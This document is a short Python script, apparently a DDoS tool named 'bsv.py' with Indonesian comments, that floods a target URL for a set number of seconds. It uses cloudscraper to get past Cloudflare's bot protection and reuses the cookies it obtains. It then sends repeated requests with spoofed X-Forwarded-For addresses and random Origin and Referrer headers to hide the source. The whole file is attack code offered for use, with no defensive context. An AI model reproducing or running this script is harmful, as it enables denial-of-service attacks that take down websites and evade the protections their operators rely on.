import cloudscraper
import requests
import sys
import random
import string
import time
import threading

# Mendapatkan URL dan interval waktu dari argumen
url = sys.argv[1]
time_interval = int(sys.argv[2])

# Memastikan bahwa skrip dijalankan dengan argumen yang benar
if len(sys.argv) <= 2:
    print('Usage: python bsv.py <url> <time>')
    sys.exit(-1)

# Fungsi untuk menghasilkan byte acak
def random_byte():
    return str(random.randint(0, 255))

# Fungsi untuk menghasilkan string acak
def random_string_generate(length):
    characters = string.ascii_lowercase + string.digits
    return ''.join(random.choice(characters) for i in range(length))

# Fungsi untuk mengirim permintaan
def kirim_pengiriman():
    scraper = cloudscraper.create_scraper()
    try:
        response = scraper.get(url)
        cookie = response.cookies.get_dict()
        user_agent = response.request.headers.get('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3')

        random_string = random_string_generate(10)
        fake_ip = f'{random_byte()}.{random_byte()}.{random_byte()}.{random_byte()}'

        headers = {
            'User-Agent': user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Upgrade-Insecure-Requests': '1',
            'Cookie': '; '.join([f'{key}={value}' for key, value in cookie.items()]),
            'Origin': f'http://{random_string}.com',
            'Referrer': f'http://google.com/{random_string}',
            'X-Forwarded-For': fake_ip
        }

        requests.get(url, headers=headers)
    except Exception as e:
        print('Failed to get website data:', e)

# Fungsi utama untuk mengelola threading
def main():
    interval = time_interval
    start_time = time.time()

    while time.time() - start_time <= interval:
        thread = threading.Thread(target=kirim_pengiriman)
        thread.start()
        thread.join()

if __name__ == '__main__':
    main()
